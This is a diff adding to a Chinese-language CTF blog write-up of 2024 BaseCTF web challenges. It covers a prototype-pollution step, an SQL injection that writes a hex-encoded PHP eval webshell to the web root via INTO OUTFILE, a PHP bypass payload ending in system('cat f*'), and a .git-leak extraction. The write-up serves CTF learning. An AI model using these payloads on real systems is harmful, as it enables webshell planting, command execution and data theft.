@@ -186,6 +186,28 @@ up">
 <p>我们访问&#x2F;pollute进行原型链污染</p>
 <p><img src="/source/images/2024BaseCTF-web/image-20240907162619965.png" alt="image-20240907162619965"></p>
 <p>想这样直接读flag文件，放包后显示污染成功。然后我们访问&#x2F;read，此时已经读取到了flag</p>
+<h3 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h3><p><img src="/source/images/2024BaseCTF-web/37.png"></p>
+<p>学到了代替select的方法：values</p>
+<p>?sql&#x3D;values(0x3c3f706870206576616c28245f504f53545b2761275d293b3f3e) into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php’</p>
+<p>将一句话木马<?php eval($_POST['a']);?>转为16进制写入文件中，然后访问</p>
+<p><img src="/source/images/2024BaseCTF-web/36.png"></p>
+<p>即可查看flag</p>
+<h1 id="Fin"><a href="#Fin" class="headerlink" title="Fin"></a>Fin</h1><h3 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h3><p>主要考点:回溯绕过非贪婪匹配</p>
+<p><img src="/source/images/2024BaseCTF-web/34.png"></p>
+<p>第一个要求传参e_m.p 但是get传参参数名中有.会被转换为_，我们传参e[m.p这样[会被转换为下划线后面.就不会被转换成下划线了。</p>
+<p>这里要求e_m.p每一个字符都必须是数字。我们用8进制传参0337522,intval函数会自动识别他是8进制并转为10进制这样就绕过了第一个if。</p>
+<p>第二个if是贪婪匹配，要求不能有hacker，第三个if要求有hacker但不能在第一位</p>
+<p>这里就用回溯绕过传100万个a（但这里我传了100万零1个才能绕过）让他绕过正则，这样也能检测到hacker</p>
+<p>a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;stdin&amp;c&#x3D;fgets这三个传参是通过SplFileObject类加上php:&#x2F;&#x2F;stdin流获取我们的输入然后fgets方法读取文件</p>
+<p>payload：?e[m.p&#x3D;0337522&amp;a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;stdin&amp;c&#x3D;fgets</p>
+<p>try&#x3D;aaa(100万个)hacker&amp;shell&#x3D;system(‘cat f*’);</p>
+<p><img src="/source/images/2024BaseCTF-web/35.png"></p>
+<h3 id="Back-to-the-future"><a href="#Back-to-the-future" class="headerlink" title="Back to the future"></a>Back to the future</h3><p>看名字想到机器人? 查看robots.txt</p>
+<p>发现禁止访问&#x2F;.git</p>
+<p>git泄露，但是我git扫不出来，用这个</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a></p>
+<p>cd Git_Extract</p>
+<p>python 2 git_extract.py URL&#x2F;.git&#x2F;</p>
 </section>
     
         
